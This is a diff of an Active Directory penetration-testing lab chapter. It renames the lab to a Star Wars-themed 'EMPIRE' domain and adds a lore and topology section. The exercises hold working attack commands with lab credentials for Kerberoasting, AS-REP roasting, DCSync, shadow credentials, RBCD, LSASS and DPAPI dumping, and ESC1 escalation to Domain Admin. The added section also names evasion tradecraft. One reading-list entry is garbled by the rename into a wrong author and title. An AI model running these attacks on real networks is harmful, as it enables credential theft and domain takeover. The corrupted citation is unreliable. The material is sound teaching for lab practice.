+impacket-GetNPUsers empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
+    -request -outputfile ~/empire/loot/02-cred/asreproast/all.hash
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
+    -request -outputfile ~/empire/loot/02-cred/kerberoast/all.hash
 
-hashcat -m 18200 ~/dvad/loot/02-cred/asreproast/all.hash rockyou.txt -r best64.rule
-hashcat -m 13100 ~/dvad/loot/02-cred/kerberoast/all.hash rockyou.txt -r best64.rule
+hashcat -m 18200 ~/empire/loot/02-cred/asreproast/all.hash rockyou.txt -r best64.rule
+hashcat -m 13100 ~/empire/loot/02-cred/kerberoast/all.hash rockyou.txt -r best64.rule
 ```
 
 Record cracked plaintexts and what privileges each grants.
@@ -1286,8 +1286,8 @@ Record cracked plaintexts and what privileges each grants.
 ### Exercise 10.B — DCSync
 
 ```bash
-impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 \
-    -just-dc-user krbtgt -outputfile ~/dvad/loot/02-cred/dcsync/krbtgt
+impacket-secretsdump empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 \
+    -just-dc-user krbtgt -outputfile ~/empire/loot/02-cred/dcsync/krbtgt
 ```
 
 Save the krbtgt NT hash, AES128, AES256 separately. You'll need them in chapter 12.
@@ -1295,9 +1295,9 @@ Save the krbtgt NT hash, AES128, AES256 separately. You'll need them in chapter 
 ### Exercise 10.C — Shadow Credentials
 
 ```bash
-certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' \
-    -dc-ip 10.10.0.10 -account 'sql01$'
-impacket-psexec -hashes :<sql01$_NT> 'corp.local/sql01$@sql01.corp.local'
+certipy shadow auto -u peter.parker@empire.local -p 'EmpireLab2024!' \
+    -dc-ip 10.10.0.10 -account 'kamino$'
+impacket-psexec -hashes :<kamino$_NT> 'empire.local/kamino$@kamino.empire.local'
 ```
 
 Now try a manual flow with `certipy shadow add` / `certipy shadow list` / `certipy shadow remove`. Verify the planted KeyCredential is gone afterward.
@@ -1307,14 +1307,14 @@ Now try a manual flow with `certipy shadow add` / `certipy shadow list` / `certi
 Follow §10.7 step-by-step. Confirm:
 
 - `EVIL$` exists in AD.
-- `msDS-AllowedToActOnBehalfOfOtherIdentity` on FILE01$ lists EVIL$.
-- `dir \\file01\C$` succeeds with the impersonated Administrator ticket.
+- `msDS-AllowedToActOnBehalfOfOtherIdentity` on scarif$ lists EVIL$.
+- `dir \\scarif\C$` succeeds with the impersonated Administrator ticket.
 
 Then *roll it back* — remove the RBCD and the EVIL$ computer.
 
 ### Exercise 10.E — LSASS dump comparison
 
-On file01, dump LSASS three ways:
+On scarif, dump LSASS three ways:
 
 1. `comsvcs MiniDump`
 2. `procdump -ma lsass.exe`
@@ -1324,23 +1324,23 @@ Compare what `pypykatz` extracts from each. Note the size and any AV/Defender co
 
 ### Exercise 10.F — DPAPI walkthrough
 
-1. As an admin, extract the domain backup key from corp.local.
-2. Pull tony.stark's master key file off ws01.
+1. As an admin, extract the domain backup key from empire.local.
+2. Pull tony.stark's master key file off tatooine.
 3. Decrypt master key with backup pvk.
 4. Decrypt tony.stark's saved Chrome login DB.
 
 ### Exercise 10.G — gMSA dump
 
-Find a gMSA in corp.local (use ENUM-045 from chapter 08). Identify the readers group. Add `peter.parker` to the readers group (only possible if you have GenericWrite on that group). Dump the gMSA password with `gMSADumper.py`.
+Find a gMSA in empire.local (use ENUM-045 from chapter 08). Identify the readers group. Add `peter.parker` to the readers group (only possible if you have GenericWrite on that group). Dump the gMSA password with `gMSADumper.py`.
 
 ### Exercise 10.H — ESC1 → DA
 
 ```bash
 certipy find -u peter.parker -p ... -dc-ip 10.10.0.10 -vulnerable
 # pick a template tagged ESC1
-certipy req -u peter.parker -p ... -ca CORP-CA -template Vuln -upn administrator@corp.local
+certipy req -u peter.parker -p ... -ca EMPIRE-CA -template Vuln -upn administrator@empire.local
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
-impacket-secretsdump -hashes :<adm_nt> corp.local/Administrator@dc01.corp.local -just-dc
+impacket-secretsdump -hashes :<adm_nt> empire.local/Administrator@coruscant.empire.local -just-dc
 ```
 
 ### Exercise 10.I — Coerce + relay variants
@@ -1387,7 +1387,7 @@ Take five hashes (NT, NetNTLMv2, Kerb-TGS-RC4, Kerb-AS-REP, KeePass). Crack each
 
 - **harmj0y — *Kerberoasting Revisited*** — the canonical write-up.
 - **TheHackerRecipes — Credentials category** — practical reference, well-indexed.
-- **Sean Metcalf — *Active Directory Kerberos Attacks*** — DEF CON 24 talk.
+- **Sean Medin — *empire-Mifflin-Active-Directory Kerberos Attacks*** — DEF CON 24 talk.
 - **Tim Medin — *Attacking Microsoft Kerberos*** — the original Kerberoasting paper.
 - **SpecterOps — *Shadow Credentials*** — Elad Shamir's blog post.
 - **Microsoft — *DPAPI*** — `dpapi.dll` SDK docs.
@@ -1395,3 +1395,85 @@ Take five hashes (NT, NetNTLMv2, Kerb-TGS-RC4, Kerb-AS-REP, KeePass). Crack each
 - **Pixis — *Coerced Authentication and Relay Chains*** — practical.
 
 Next: [11-lateral-and-privesc.md](11-lateral-and-privesc.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
